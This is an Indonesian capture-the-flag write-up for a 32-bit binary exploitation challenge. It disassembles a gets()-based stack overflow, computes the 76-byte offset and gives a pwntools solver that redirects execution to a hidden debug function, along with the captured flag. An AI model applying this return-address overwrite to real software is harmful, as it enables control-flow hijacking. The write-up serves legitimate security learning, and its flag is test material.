# Write Up Asgama CTF Buffer2 [75 pts]

Kategori : Binary Exploitation

Diberikan File ELF 32-bit not stripped.
Command : ```file buf2```
```
xnor@zeroday:~/AsgamaCTF/WriteUp$ file buf2 
buf2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=422a2c2391911b03f182ed6a8a2b65ca200f276c, not stripped
```
Oke, langsung lihat disassemble fungsi ```main``` dengan GDB+Peda.

Fungsi ```main```:
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804855d <+0>:	lea    ecx,[esp+0x4]
   0x08048561 <+4>:	and    esp,0xfffffff0
   0x08048564 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048567 <+10>:	push   ebp
   0x08048568 <+11>:	mov    ebp,esp
   0x0804856a <+13>:	push   ecx
   0x0804856b <+14>:	sub    esp,0x4
   0x0804856e <+17>:	call   0x8048545 <hah>
   0x08048573 <+22>:	sub    esp,0xc
   0x08048576 <+25>:	push   0x8048623
   0x0804857b <+30>:	call   0x80483a0 <puts@plt>
   0x08048580 <+35>:	add    esp,0x10
   0x08048583 <+38>:	mov    eax,0x0
   0x08048588 <+43>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804858b <+46>:	leave  
   0x0804858c <+47>:	lea    esp,[ecx-0x4]
   0x0804858f <+50>:	ret    
End of assembler dump. 
```
Ternyata fungsi ```main``` memanggil fungsi ```hah``` Yang menggunakan ```gets``` untuk mengambil inputan, sedangkan ```gets``` sendiri memiliki vulnerable yang sangat berbahaya, sehingga kita bisa mengubah return address ke fungsi tujuan kita untuk mendapat flag.

Fungsi ```hah```:
```
gdb-peda$ pdisas hah
Dump of assembler code for function hah:
   0x08048545 <+0>:	push   ebp
   0x08048546 <+1>:	mov    ebp,esp
   0x08048548 <+3>:	sub    esp,0x48
   0x0804854b <+6>:	sub    esp,0xc
   0x0804854e <+9>:	lea    eax,[ebp-0x48]
   0x08048551 <+12>:	push   eax
   0x08048552 <+13>:	call   0x8048390 <gets@plt>
   0x08048557 <+18>:	add    esp,0x10
   0x0804855a <+21>:	nop
   0x0804855b <+22>:	leave  
   0x0804855c <+23>:	ret    
End of assembler dump.
```

Variable ```gets``` Hanya diberi size sebesar 0x48 atau 72 dalam desimal. Sehingga jarak antara offset sampai return address adalah ```72 + 4 = 76```. 4 disitu adalah jumlah 1 register 32 bit.
Oke, karena kita sudah dapat offset nya sekarang cari address tujuan kita yaitu fungsi ```debug```.
Untuk mencari address ```debug```, kita bisa gunakan objdump.
Command : ```objdump -D buf2 | grep debug```
```
xnor@zeroday:~/AsgamaCTF/WriteUp$ objdump -D buf2 | grep debug
0804851c <debug>:
```
Address debug : ```0x0804851c``` tapi harus dijadiin little endian dulu. Jadi : ```\x1c\x85\x04\x08``` atau bisa pake fungsi yang ada di pwntools.
Mantap, langsung aja buat solver nya. (Pake pwntools biar rapi wkwk)

```solver.py```
```
from pwn import *

#r = process("./buf2")
r = remote("asgama.web.id", 40202)
offset = 76
debug = p32(0x0804851c)
payload = "A"*offset + debug

r.send(payload)
r.interactive()
```
Result :
```
xnor@zeroday:~/AsgamaCTF/WriteUp$ python solver.py 
[+] Opening connection to asgama.web.id on port 40202: Done
[*] Switching to interactive mode
$ 
$ ls
buf2
flag
$ cat flag
GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}
$
[*] Closed connection to asgama.web.id port 40202
```

Flag : ```GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}```

Note : Untuk melihat fungsi bisa dengan GDB dengan command ```info functions``` atau ```i func```.
